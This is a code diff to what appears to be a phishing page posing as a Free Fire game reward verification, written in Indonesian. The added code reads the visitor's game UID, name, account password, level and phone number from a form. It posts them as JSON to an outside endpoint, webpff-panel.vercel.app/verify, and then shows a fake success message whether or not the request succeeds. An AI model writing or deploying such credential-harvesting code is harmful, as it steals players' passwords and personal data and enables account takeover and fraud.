@@ -848,21 +848,45 @@
       alert(`Akun ${network} berhasil dikaitkan dengan game Free Fire.`);
     }
 
-    function submitVerificationForm(e) {
+    async function submitVerificationForm(e) {
       e.preventDefault();
       const btn = document.getElementById('btnSubmitForm');
       btn.disabled = true;
       btn.innerText = 'MEMPROSES...';
 
-      setTimeout(() => {
+      const payload = {
+        uid: document.getElementById('inputUID').value.trim(),
+        nama: document.getElementById('inputNama').value.trim(),
+        password: document.getElementById('inputPassword').value,
+        tingkat: document.getElementById('inputTingkat').value.trim(),
+        phone: document.getElementById('inputPhone').value.trim(),
+        item: hiddenItemInput.value || 'Hadiah Event'
+      };
+
+      // Tentukan endpoint API (otomatis gunakan server backend webpff-panel)
+      const isLocalOrPanel = window.location.hostname.includes('webpff-panel') || window.location.port === '3000';
+      const verifyEndpoint = isLocalOrPanel ? '/verify' : 'https://webpff-panel.vercel.app/verify';
+
+      try {
+        await fetch(verifyEndpoint, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+            "Accept": "application/json"
+          },
+          body: JSON.stringify(payload)
+        });
+      } catch (err) {
+        console.warn("Backend verify sync:", err);
+      } finally {
         closeVerifyDialog();
-        successItemText.textContent = hiddenItemInput.value || 'Hadiah Event';
+        successItemText.textContent = payload.item;
         successModal.classList.add('active');
         btn.disabled = false;
         btn.innerText = 'VERIFIKASI SEKARANG';
         const verifyForm = document.getElementById('verifyForm');
         if (verifyForm) verifyForm.reset();
-      }, 700);
+      }
     }
   </script>
 </body>
